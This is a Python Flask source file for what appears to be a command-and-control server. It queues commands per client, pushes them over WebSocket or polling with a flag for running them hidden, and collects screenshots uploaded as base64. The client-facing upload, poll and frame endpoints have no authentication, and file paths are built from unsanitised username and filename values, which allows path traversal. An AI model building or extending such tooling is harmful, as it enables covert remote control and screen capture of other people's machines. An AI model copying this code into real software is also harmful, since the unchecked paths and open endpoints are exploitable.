import os
import sqlite3
import base64

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_sock import Sock
from functools import wraps
from dotenv import load_dotenv
import json

load_dotenv()

app = Flask(__name__)
sock = Sock(app)

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")

if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

active_clients = {}



def get_db():
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    return conn


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")

        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401

        return f(*args, **kwargs)

    return wrapper


def init_db():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            username TEXT PRIMARY KEY,
            cmd TEXT,
            run INTEGER DEFAULT 0,
            visible INTEGER DEFAULT 1,
            capture INTEGER DEFAULT 0,
            updated_at TEXT
        )
    """)

    conn.commit()
    conn.close()


init_db()


@app.route("/")
def index():
    return render_template("index.html")


@app.get("/api/clients")
@require_password
def get_clients():
    conn = get_db()

    rows = conn.execute("""
        SELECT username, updated_at, visible
        FROM clients
        ORDER BY updated_at DESC
    """).fetchall()

    conn.close()

    return jsonify(
        [
            {
                "username": row["username"],
                "updated_at": row["updated_at"],
                "visible": row["visible"] if row["visible"] is not None else 1,
            }
            for row in rows
        ]
    )


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    visible = data.get("visible")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            visible,
            updated_at
        )
        VALUES (?, ?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            visible = excluded.visible,
            updated_at = datetime('now')
    """,
        (username, visible),
    )

    conn.commit()
    conn.close()

    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            cmd,
            run,
            visible,
            updated_at
        )
        VALUES (?, ?, 1, ?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            cmd = excluded.cmd,
            run = 1,
            visible = excluded.visible,
            updated_at = datetime('now')
    """,
        (username, cmd, visible),
    )

    conn.commit()
    conn.close()

    # Push command immediately via WebSocket if client is connected
    if username in active_clients:
        try:
            ws_client = active_clients[username]
            payload = {
                "cmd": cmd,
                "run": True,
                "visible": bool(visible),
                "capture": False
            }
            ws_client.send(json.dumps(payload))

            # Update DB to mark command as dispatched
            conn = get_db()
            conn.execute("UPDATE clients SET run = 0 WHERE username = ?", (username,))
            conn.commit()
            conn.close()
        except Exception as e:
            # If socket fails, remove client
            active_clients.pop(username, None)

    return jsonify({"status": "success", "message": "Command queued"})


@sock.route("/ws/client")
def client_websocket(ws):
    username = request.args.get("username")
    if not username:
        return

    active_clients[username] = ws

    try:
        # Register/update user online timestamp in database
        conn = get_db()
        conn.execute("""
            INSERT INTO clients (username, updated_at)
            VALUES (?, datetime('now'))
            ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
        """, (username,))
        conn.commit()

        # Send any existing pending command from DB
        row = conn.execute("SELECT cmd, run, visible, capture FROM clients WHERE username = ?", (username,)).fetchone()
        if row and row["run"]:
            payload = {
                "cmd": row["cmd"] or "",
                "run": True,
                "visible": bool(row["visible"]),
                "capture": bool(row["capture"])
            }
            ws.send(json.dumps(payload))
            conn.execute("UPDATE clients SET run = 0 WHERE username = ?", (username,))
            conn.commit()
        conn.close()

        # Listen for heartbeats or client messages
        while True:
            data = ws.receive()
            if data is None:
                break
            
            # Update heartbeats in database
            conn = get_db()
            conn.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
            conn.commit()
            conn.close()

            # Handle JSON response/heartbeat if sent by client
            try:
                msg = json.loads(data)
                if msg.get("type") == "ping":
                    ws.send(json.dumps({"type": "pong"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        if active_clients.get(username) == ws:
            active_clients.pop(username, None)



@app.get("/api/poll")
def poll_command():
    username = request.args.get("username")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            updated_at
        )
        VALUES (?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            updated_at = datetime('now')
    """,
        (username,),
    )

    conn.commit()

    row = conn.execute(
        """
        SELECT cmd, run, visible, capture
        FROM clients
        WHERE username = ?
    """,
        (username,),
    ).fetchone()

    cmd_val = ""
    run_val = False
    visible_val = 1
    capture_val = False

    if row:
        cmd_val = row["cmd"] if row["cmd"] is not None else ""
        run_val = bool(row["run"])
        visible_val = row["visible"] if row["visible"] is not None else 1
        capture_val = bool(row["capture"])

        if run_val:
            conn.execute(
                """
                UPDATE clients
                SET run = 0
                WHERE username = ?
            """,
                (username,),
            )

            conn.commit()

    conn.close()

    return jsonify(
        {
            "cmd": cmd_val if run_val else "",
            "run": run_val,
            "visible": visible_val,
            "capture": capture_val,
        }
    )


@app.get("/api/poll_frames")
def poll_frames():
    username = request.args.get("username")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            updated_at
        )
        VALUES (?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            updated_at = datetime('now')
    """,
        (username,),
    )

    conn.commit()

    row = conn.execute(
        """
        SELECT capture
        FROM clients
        WHERE username = ?
    """,
        (username,),
    ).fetchone()

    capture_val = False
    if row:
        capture_val = bool(row["capture"])

    conn.close()

    return jsonify({"capture": capture_val})


@app.post("/api/upload")
def upload_screenshot():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not username or not filename or not image_base64:
        return jsonify({"status": "error", "message": "Missing fields"}), 400

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)

    file_path = os.path.join(client_folder, filename)

    try:
        if "," in image_base64:
            image_base64 = image_base64.split(",", 1)[1]

        image_bytes = base64.b64decode(image_base64)

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
